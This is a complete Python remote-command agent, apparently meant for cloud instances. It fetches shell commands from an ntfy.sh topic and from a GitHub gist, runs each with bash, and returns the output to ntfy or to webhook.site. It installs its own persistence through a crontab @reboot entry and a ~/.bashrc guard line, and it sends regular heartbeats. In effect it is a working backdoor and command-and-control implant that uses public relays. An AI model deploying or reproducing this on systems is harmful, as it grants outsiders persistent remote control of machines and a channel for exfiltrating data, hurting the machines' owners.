#!/usr/bin/env python3
# 云端 agent v4 双通道：ntfy 主 + GitHub gist 备（命令下发）
# 回执：ntfy 主，连续失败自动兜底到 webhook.site（WH_HOOK_ID，凭证不落云端）
# 自启动：启动时自装 crontab @reboot + .bashrc 守卫（幂等），实例重启后自动拉起
# 环境变量：
#   NTFY_BASE, DSH_CMD_TOPIC, DSH_RES_TOPIC   （原有）
#   GH_GIST_ID, GH_GIST_FILE                  （gist 命令队列）
#   GH_POLL_INTERVAL                           （gist 轮询秒数，默认 60）
#   WH_HOOK_ID                                 （webhook.site 回执兜底 uuid）
import os, sys, json, time, subprocess, threading, urllib.request, urllib.parse, socket, hashlib

# 自读同目录 env 文件（优先级低于真实环境变量），避免依赖 shell 传参
_env_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent_dual.env")
if os.path.exists(_env_file):
    for _line in open(_env_file, encoding="utf-8"):
        _line = _line.strip()
        if "=" in _line and not _line.startswith("#") and "=" in _line:
            _k, _v = _line.split("=", 1)
            os.environ.setdefault(_k, _v)

BASE = os.environ.get("NTFY_BASE", "https://ntfy.sh").rstrip("/")
CMD = os.environ["DSH_CMD_TOPIC"]
RES = os.environ["DSH_RES_TOPIC"]
GH_GIST = os.environ.get("GH_GIST_ID", "")
GH_UID = os.environ.get("GH_UID", "shuchen1112010-netizen")
GH_FILE = os.environ.get("GH_GIST_FILE", "cmd.jsonl")
GH_POLL = int(os.environ.get("GH_POLL_INTERVAL", "60"))
WH_HOOK = os.environ.get("WH_HOOK_ID", "").strip()
HOST = socket.gethostname()
CHUNK = 3200
T0 = time.time()
seen = set()          # 统一去重集合："n:"+ntfy_id / "g:"+gist_id
_last_gh = 0


def log(*a):
    print(time.strftime("%H:%M:%S"), *a, flush=True)


def http_get(url, timeout=25, headers=None):
    hdr = {"User-Agent": "dsh-agent"}
    if headers:
        hdr.update(headers)
    req = urllib.request.Request(url, headers=hdr)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")


def post(msg, title="res", tag=""):
    """回执：ntfy 主，3 次失败自动兜底 webhook.site。"""
    body = msg.encode("utf-8")
    hdr = {"Title": title, "User-Agent": "dsh-agent"}
    if tag:
        hdr["Tags"] = tag
    req = urllib.request.Request(BASE + "/" + RES, data=body, method="POST", headers=hdr)
    for _ in range(3):
        try:
            with urllib.request.urlopen(req, timeout=25) as r:
                return r.status
        except Exception as e:
            log("[warn] post fail:", e)
            time.sleep(2)
    if WH_HOOK:
        try:
            fdata = urllib.parse.urlencode(
                {"t": title, "host": HOST, "m": msg[:8000]}).encode("utf-8")
            req2 = urllib.request.Request("https://webhook.site/" + WH_HOOK,
                                          data=fdata, headers={"User-Agent": "dsh-agent"})
            with urllib.request.urlopen(req2, timeout=20) as r:
                log("[res] fallback via webhook.site")
                return r.status
        except Exception as e:
            log("[warn] webhook fallback fail:", e)
    return None


def send_chunks(text, seq):
    parts = [text[i:i + CHUNK] for i in range(0, len(text), CHUNK)] or [""]
    n = len(parts)
    for i, p in enumerate(parts):
        post(p, title="%s-%s-%d/%d" % (HOST, seq, i + 1, n))


def dispatch(mid, cmd):
    """统一去重 + 起线程执行命令。"""
    if mid in seen:
        return 0
    seen.add(mid)
    cmd = (cmd or "").strip()
    if not cmd:
        return 0
    seq = hashlib.md5(mid.encode()).hexdigest()[:6]
    threading.Thread(target=run_and_report, args=(cmd, seq), daemon=True).start()
    return 1


def run_and_report(cmd, seq):
    t0 = time.time()
    log("[run]", seq, cmd[:100])
    try:
        p = subprocess.run(cmd, shell=True, executable="/bin/bash",
                           capture_output=True, text=True, timeout=7200)
        out = (p.stdout or "") + (p.stderr or "")
        rc = p.returncode
    except subprocess.TimeoutExpired:
        out, rc = "[timeout 7200s]", -1
    except Exception as e:
        out, rc = "[error] %s" % e, -1
    dt = time.time() - t0
    head = "=== seq=%s rc=%s %.1fs ===\n" % (seq, rc, dt)
    log("[done]", seq, "rc=", rc, "%.1fs" % dt)
    send_chunks(head + out, seq)


def poll_ntfy(first=False):
    """ntfy 命令源（主）。"""
    txt = http_get("%s/%s/json?poll=1&since=all" % (BASE, CMD))
    n = 0
    for line in txt.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            ev = json.loads(line)
        except Exception:
            continue
        if ev.get("event") != "message":
            continue
        mid = "n:" + str(ev.get("id"))
        if first:
            seen.add(mid)          # baseline：只登记不执行
            continue
        n += dispatch(mid, ev.get("message"))
    return n


def poll_gist(first=False):
    """GitHub gist 命令源（备）。raw CDN 直读（无 API 60/h 限额），随机参数破缓存。"""
    global _last_gh
    if not GH_GIST:
        return 0
    now = time.time()
    if not first and (now - _last_gh) < GH_POLL:
        return 0
    _last_gh = now
    url = "https://gist.githubusercontent.com/%s/%s/raw/%s?_=%d" % (
        GH_UID, GH_GIST, GH_FILE, int(now * 1000))
    try:
        content = http_get(url, headers={"Cache-Control": "no-cache", "Pragma": "no-cache"})
    except Exception as e:
        log("[gist poll err]", e)
        return 0
    n = 0
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            ev = json.loads(line)
        except Exception:
            continue
        if not isinstance(ev, dict):      # 跳过 [] 等非对象行
            continue
        mid = "g:" + str(ev.get("id"))
        if first:
            seen.add(mid)
            continue
        n += dispatch(mid, ev.get("cmd"))
    return n


def autostart_install():
    """幂等自装：crontab @reboot（可选）+ .bashrc 守卫，实例重启/开终端都能自动拉起。"""
    d = os.path.dirname(os.path.abspath(__file__))
    py = sys.executable or "/usr/bin/python3"
    # crontab 在部分容器里不存在，缺了不影响 bashrc 守卫
    try:
        entry = "@reboot sleep 15 && cd %s && %s -u agent_dual.py >> agent_dual.log 2>&1" % (d, py)
        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout or ""
        if "agent_dual.py" not in cur:
            subprocess.run(["crontab", "-"], input=(cur.rstrip() + "\n" + entry + "\n"),
                           text=True, capture_output=True)
            log("[autostart] crontab @reboot installed")
    except Exception as e:
        log("[autostart] crontab unavailable:", e)
    try:
        rc_path = os.path.expanduser("~/.bashrc")
        guard = ("pgrep -f agent_dual.py >/dev/null 2>&1 || (cd %s && nohup %s -u agent_dual.py "
                 ">> agent_dual.log 2>&1 &)  # dsh-agent-guard") % (d, py)
        rc = open(rc_path, encoding="utf-8").read() if os.path.exists(rc_path) else ""
        if "dsh-agent-guard" not in rc:
            open(rc_path, "a", encoding="utf-8").write("\n" + guard + "\n")
            log("[autostart] bashrc guard installed")
    except Exception as e:
        log("[autostart] bashrc skip:", e)


def heartbeat():
    """每 15 分钟发一次存活心跳（ntfy 失败自动走 webhook 兜底），便于本机确认活性。"""
    n = 0
    while True:
        time.sleep(900)
        n += 1
        post("[heartbeat] alive #%d uptime=%dmin cmds=%d" % (n, int(time.time() - T0) // 60, len(seen)),
             title="heartbeat", tag="heart")


def main():
    log("[agent v4.3 dual] host=%s ntfy=%s gist=%s poll=%ss wh=%s" %
        (HOST, CMD, GH_GIST or "(off)", GH_POLL, WH_HOOK[:8] or "(off)"))
    # baseline：两条源的历史都登记，不执行
    for fn, label in ((poll_ntfy, "ntfy"), (poll_gist, "gist")):
        try:
            fn(first=True)
            log("[agent] baseline", label, "loaded, seen=", len(seen))
        except Exception as e:
            log("[warn] baseline", label, "fail:", e)
    autostart_install()
    threading.Thread(target=heartbeat, daemon=True).start()
    post("agent v4.3-dual online: %s" % HOST, title="agent-online", tag="white_check_mark")
    while True:
        try:
            k = poll_ntfy()
            if k:
                log("[cmd] from ntfy x%d" % k)
        except Exception as e:
            log("[ntfy poll err]", e)
        try:
            k2 = poll_gist()
            if k2:
                log("[cmd] from GIST x%d" % k2)
        except Exception as e:
            log("[gist poll err]", e)
        time.sleep(2)


if __name__ == "__main__":
    main()
